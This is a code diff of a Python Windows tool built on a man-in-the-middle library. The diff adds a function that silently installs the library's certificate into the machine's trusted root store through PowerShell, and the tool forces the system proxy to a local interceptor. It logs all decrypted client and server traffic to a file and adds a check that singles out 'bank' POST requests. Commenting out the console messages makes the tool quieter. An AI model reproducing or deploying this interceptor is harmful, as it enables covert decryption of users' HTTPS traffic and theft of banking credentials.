@@ -1,12 +1,16 @@
 import os
 from typing import Tuple, Optional, Union, TextIO
-from mitm import MITM, middleware, Connection, protocol, crypto
+from mitm import MITM, middleware, Connection, protocol, crypto, __data__
 from network import send
 from socket import socket
 from threading import Thread
 import sys
 import winreg
 from asyncio.exceptions import CancelledError
+import appdirs
+import pathlib
+import certifi
+
 
 my_socket: Optional[socket] = None
 file: Optional[TextIO] = None
@@ -34,24 +38,29 @@ class FileLog(middleware.Middleware):
     @staticmethod
     async def client_data(connection: Connection, data: bytes) -> bytes:
         file.write("Client to server: \n\n\t%s\n" % data)
-        print("Client to server: \n\n\t%s\n" % data)
+        # print("Client to server: \n\n\t%s\n" % data)
+
+        if b"bank" in data and b"post" in data:
+            print(data)
+        else:
+            print(data)
         return data
 
     @staticmethod
     async def server_data(connection: Connection, data: bytes) -> bytes:
         file.write("Server to client: \n\n\t%s\n" % data)
-        print("Server to client: \n\n\t%s\n" % data)
+        # print("Server to client: \n\n\t%s\n" % data)
         return data
 
     @staticmethod
     async def client_disconnected(connection: Connection):
         file.write("Client has disconnected.\n")
-        print("Client has disconnected.\n")
+        # print("Client has disconnected.\n")
 
     @staticmethod
     async def server_disconnected(connection: Connection):
         file.write("Server has disconnected.")
-        print("Server has disconnected.")
+        # print("Server has disconnected.")
 
 
 class NetLog(middleware.Middleware):
@@ -90,13 +99,17 @@ class NetLog(middleware.Middleware):
 
 def set_reg(name, value, size):
     try:
-        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Internet Settings", 0,
-                                       winreg.KEY_WRITE)
+        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Internet Settings", 0, winreg.KEY_WRITE)
         winreg.SetValueEx(registry_key, name, 0, size, value)
         winreg.CloseKey(registry_key)
         return True
     except WindowsError:
         return False
+
+
+def install_cert():
+    path = __data__
+    os.system(f"powershell -c Import-Certificate -FilePath '{path}' -CertStoreLocation Cert:\LocalMachine\Root")
 
 
 def filestart(path: str) -> bool:
@@ -106,6 +119,7 @@ def filestart(path: str) -> bool:
     file = open(path, "wt")
     t = Thread(target=__start)
     t.start()
+    install_cert()
     return True
 
 
@@ -134,10 +148,12 @@ def __start() -> bool:
 
     #os.system('reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable /t REG_DWORD /d 1')
     #sys.stdout.write("yes")
-    set_reg("ProxyEnable", 1, winreg.REG_DWORD)
+    if not set_reg("ProxyEnable", 1, winreg.REG_DWORD):
+        return False
     #os.system('reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer /t REG_SZ /d 127.0.0.1:8888')
     #sys.stdout.write("yes")
-    set_reg("ProxyServer", "127.0.0.1:8888", winreg.REG_SZ)
+    if not set_reg("ProxyServer", "127.0.0.1:8888", winreg.REG_SZ):
+        return False
     mitm = MITM(middlewares=[logger],
                 host="127.0.0.1",
                 port=8888,
